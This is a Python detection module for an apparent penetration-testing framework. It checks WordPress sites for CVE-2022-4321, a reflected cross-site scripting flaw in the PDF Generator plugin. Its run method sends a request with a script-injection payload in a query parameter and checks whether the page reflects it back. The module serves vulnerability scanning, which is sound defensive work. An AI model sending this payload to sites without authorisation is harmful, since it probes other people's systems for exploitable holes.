#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The plugin includes a vendored dompdf example file which is susceptible to Reflected Cross-Site Scripting and ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PDF Generator for WordPress < 1.1.2 - Cross Site Scripting Detection',
        'description': 'The plugin includes a vendored dompdf example file which is susceptible to Reflected Cross-Site Scripting and could be used against high privilege users such as admin',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wpscan', 'wordpress', 'wp', 'wp-plugin', 'xss', 'pdf-generator-for-wp', 'wpswings', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/6ac1259c-86d9-428b-ba98-7f3d07910644',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-4321',
            'https://wordpress.org/plugins/pdf-generator-for-wp/',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/kwalsh-rz/github-action-ecr-scan-test',
        ],
        'cve': 'CVE-2022-4321',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/pdf-generator-for-wp/package/lib/dompdf/vendor/dompdf/dompdf/I18N/Arabic/Examples/Query.php?keyword="><script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('><script>alert(document.domain)</script>', 'pdf-generator-for-wp', 'Total execution time is',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="PDF Generator for WordPress < 1.1.2 - Cross Site Scripting detected",
                path='/wp-content/plugins/pdf-generator-for-wp/package/lib/dompdf/vendor/dompdf/dompdf/I18N/Arabic/Examples/Query.php?keyword="><script>alert(document.domain)</script>',
            )
            return True
        return False

